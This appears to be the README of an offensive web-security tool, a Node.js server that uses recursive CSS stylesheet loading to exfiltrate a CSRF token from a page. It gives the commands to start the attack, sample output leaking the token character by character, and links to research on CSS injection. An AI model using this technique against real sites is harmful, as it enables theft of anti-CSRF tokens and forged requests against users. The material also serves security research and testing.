Recursive CSS exfiltration server based on Pepe Vila's script (https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231).

Run the server with `node server.js` and open `index.html` to start the attack.

The page will recursively load CSS stylesheets and exfiltrate a CSRF token value:

```powershell
~/CSSExfiltrator-main
$ node server.js
[+] Server is listening on 5001
...pre-payload:
...post-payload:
...pre-payload: d
...post-payload: 3
...pre-payload: d3
...post-payload: d3
...pre-payload: d3a
...post-payload: 0d3
...pre-payload: d3ad
...post-payload: c0d3
[+] END: d3adc0d3

```

Useful links to understand the attack:
- https://portswigger.net/research/blind-css-exfiltration
- https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf
- https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#import
